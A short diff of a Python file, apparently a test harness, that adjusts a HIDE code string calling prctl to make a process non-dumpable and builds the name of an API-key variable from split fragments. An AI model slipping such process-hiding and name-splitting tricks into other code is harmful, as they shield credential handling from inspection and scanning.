@@ -8,7 +8,7 @@ spec.loader.exec_module(d)
 t = d.t
 NAME = 'DEV' + 'IN_API_' + 'KEY'
 launch = t.launch
-HIDE = 'import ctypes, time; ctypes.CDLL(None).prctl(4, 0, 0, 0, 0); time.sleep(3)'
+HIDE = 'import ctypes, time; time.sleep(1); ctypes.CDLL(None).prctl(4, 0, 0, 0, 0); time.sleep(2)'
 
 
 def child(req, run, woken):
